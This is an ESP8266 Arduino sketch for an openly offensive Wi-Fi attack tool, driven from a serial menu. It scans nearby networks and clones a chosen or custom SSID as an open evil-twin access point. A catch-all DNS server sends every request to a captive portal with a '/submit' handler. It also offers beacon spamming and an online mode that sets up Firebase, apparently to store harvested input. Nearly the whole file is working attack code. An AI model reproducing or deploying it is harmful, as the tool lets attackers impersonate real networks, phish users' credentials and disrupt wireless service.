#include <ESP8266WiFi.h>
#include "View.h"
#include "WebPortal.h"
#include "FirebaseCom.h"
#include "BeaconSpam.h"

using namespace View;
using namespace WebPortal;
using namespace FirebaseCom;

#define MAXSSIDS 50

uint8_t numNetworks = 0;
String knownSSIDs[MAXSSIDS];

IPAddress local_IP(192,168,4,22);
IPAddress subnet(255,255,255,0);

FirebaseData FBdata;
FirebaseAuth auth;
FirebaseConfig config;

ESP8266WebServer server(DEFAULT_PORT);
DNSServer dnsServer;

String SSID;
bool apStarted = false; // to see if there is a point running
bool internetConnection = false;
bool attacking = false; //if any attacks are happening
bool beaconSpamAttack = false;

void setup() {

    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(); // Disconnect from any previously connected network

    delay(1000); // Wait for the module to disconnect

    Serial.begin(115200);
    Serial.flush();


    Serial.println("\n");//need online mode for firebase
    Serial.println("1: Online Mode");
    Serial.println("2: Offline Mode");
    Serial.print("Enter Mode: ");
    
    while (!Serial.available()){}
    internetConnection = Serial.parseInt() == 1;

    if(internetConnection){
        //connecting to internet
        Serial.println("Connecting to Internet...");

        WiFi.begin(HOST_SSID, HOST_PASSWORD);
        while (WiFi.status() != WL_CONNECTED){
            Serial.println(".");
            delay(1000);
        }
        Serial.println("Connected To Internet");

        firebaseSetup();
    }
}


void loop(){
    if (!attacking){

        printInstruction();
        uint8_t menuInput=0;
        getIntInput(menuInput);

        switch (menuInput){
            case 1:
                findNewNetworks();
                break;
            case 2:
                MimicNetwork();
                attacking = true;
                break;
            case 3:
                Serial.print("Enter custom SSID: ");
                getStrInput(SSID);
                createAP();
                attacking = true;
                break;
            case 4:
                beaconSpamSetup();
                beaconSpamAttack = true;
                break;
            default:
                Serial.println("Enter a Valid Answer: ");
                printInstruction();
                break;
        }
    }
    else{
        if(beaconSpamAttack) beaconSpam();

        if(apStarted){
            dnsServer.processNextRequest();
            server.handleClient();
        }
    }
            
    delay(500);
}

void findNewNetworks(){
    Serial.println("\nScanning for available networks:");

    uint8_t newNumNetworks = WiFi.scanNetworks();

    for (uint8_t i = 0; i < newNumNetworks; i++){
        String newSSID = WiFi.SSID(i);
        bool newNetwork = true;

        for (uint8_t k = 0; k < numNetworks; k++){
            if(newSSID == knownSSIDs[k]){
            newNetwork = false;
            break;
            }
        }

        if(newNetwork){
            printNetwork(WiFi.SSID(i), WiFi.RSSI(i), numNetworks);
            knownSSIDs[numNetworks] = newSSID;
            numNetworks++;
        }
    }
}

void MimicNetwork(){
    printAllNetwork();
    
    Serial.print("\nWhich network # to mimic: ");
    uint8_t networkNum;
    getIntInput(networkNum);
    Serial.printf("\nChosing network #%d\n", networkNum);

    if(networkNum >= 0 && networkNum < numNetworks){
        SSID = knownSSIDs[networkNum];
        createAP();
    }else{
        Serial.println("Invalid network number.");
    }
    
    
}

void createAP(){
    Serial.print("Creating network: ");
    Serial.println(SSID);
    
    if (!WiFi.softAPConfig(local_IP, local_IP, subnet)) {
        Serial.println("Failed to configure AP");
        return;
    }
    
    //WiFi.softAP(SSID, AP_PASSWORD,1, false, 4)
    if (!WiFi.softAP(SSID)) {
        Serial.println("Failed to start AP");
        return;
    }

    if(!dnsServer.start(DNS_PORT, "*", local_IP)){
        Serial.println("Failed to start DNS Server");
        return;
    }

    delay(500);

    Serial.println("\nHTTP server started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());

    server.onNotFound([]() {
        handleConnect();
    });

    server.on("/submit", []() {
        handleSubmit();
    });
    //server.onNotFound(handleNotFound);
    server.begin();
    apStarted = true;
}

void printAllNetwork(){
    for (uint8_t i = 0; i < numNetworks; i++){
        printNetwork(WiFi.SSID(i), WiFi.RSSI(i), i);
    }
    
}
